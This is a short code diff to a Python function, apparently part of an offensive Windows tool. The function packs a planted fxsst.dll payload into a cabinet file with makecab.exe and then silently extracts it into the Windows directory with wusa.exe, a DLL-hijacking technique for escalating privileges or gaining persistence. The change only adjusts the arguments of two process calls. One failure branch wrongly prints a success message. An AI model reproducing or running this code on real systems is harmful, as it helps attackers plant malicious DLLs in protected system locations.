@@ -37,7 +37,7 @@ def fax_dll(payload):
 		if os.path.isfile(os.path.join(tempfile.gettempdir(), "fxsst.dll")) == True:
 			if process().create("makecab.exe", params="{} {}".format(
 					os.path.join(tempfile.gettempdir(), "fxsst.dll"),
-					os.path.join(tempfile.gettempdir(), "suspicious.cab")), 0) == True:
+					os.path.join(tempfile.gettempdir(), "suspicious.cab"))) == True:
 				print_success("Successfully created cabinet file")
 			else:
 				print_success("Unable to create cabinet file")
@@ -51,7 +51,7 @@ def fax_dll(payload):
 		if (os.path.isfile(os.path.join(tempfile.gettempdir(), "suspicious.cab")) == True):
 			if process().create("wusa.exe", params="{} /extract:{} /quiet".format(
 					os.path.join(tempfile.gettempdir(), "suspicious.cab"),
-					information().windows_directory()),0) == True:
+					information().windows_directory())) == True:
 				print_success("Successfully extracted cabinet file")
 			else:
 				print_error("Unable to extract cabinet file")	
